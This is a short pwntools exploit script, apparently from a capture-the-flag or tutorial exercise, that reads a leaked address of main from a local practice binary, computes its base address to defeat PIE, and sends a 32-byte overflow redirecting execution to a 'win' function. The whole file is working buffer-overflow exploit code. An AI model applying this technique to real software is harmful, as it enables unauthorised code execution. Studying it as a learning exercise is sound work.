from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

p.recvuntil('at: ')
main = int(p.recvline(), 16)
print("Absolute address of main is: " + str(main))
print("Offset from base address to main is: " + str(elf.sym['main']))
elf.address = main - elf.sym['main']
print("Absolute address of main is: " + str(elf.sym['main']))
print("Base address is: " + str(elf.address))

payload = b'A' * 32
payload += p32(elf.sym['win'])
p.sendline(payload)
print(p.clean().decode('latin-1'))
